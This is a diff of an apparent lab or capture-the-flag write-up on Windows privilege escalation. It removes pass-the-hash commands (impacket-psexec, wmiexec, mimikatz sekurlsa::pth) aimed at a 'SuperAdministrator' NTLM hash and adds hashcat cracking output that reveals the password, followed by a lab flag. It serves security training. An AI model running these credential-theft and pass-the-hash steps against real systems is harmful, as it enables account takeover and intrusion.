@@ -108,26 +108,55 @@ NL$KM:f029c01ef8c0266c730380bc4d8603b643b70893c5f98bc7051d665afc16411585b38eab1b
 └─# 
 ```
 
-> psexec for popping a powershell as SuperAdministrator:
+> Cracking the hash of SuperAdministrator:
 
 ```shell
-impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c SuperAdministrator@IP powershell.exe
+┌──(root㉿kali)-[~]
+└─# hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i7-1370P, 1170/2341 MB (512 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 512 MB (1727 MB free)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+13b29964cc2480b4ef454c59562e675c:P@ssword
 ```
 
-> In my case, I used the target windows 10 instead to escalate my privs using wmiexec.
+> Now logging in, and extracting the flag:
 
 ```
-wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c SuperAdministrator@127.0.0.1
+FLAG: a98f7e323993adf96e0d7791cf8e5f04
 ```
 
-or
-
-```
-curl -sL https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe -o python_installer.exe
-python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
-del python_installer.exe
-```
-
-```
-mimikatz.exe "privilege::debug" "sekurlsa::pth /user:SuperAdministrator /domain:. /ntlm:13b29964cc2480b4ef454c59562e675c /run:cmd.exe" "exit"
-```
+![image](https://github.com/Velatryx/holbertonschool-cyber_security/blob/main/privilege_escalation_security_win/windows_privsec/Images/Screenshot%20From%202026-07-18%2018-38-47.png)
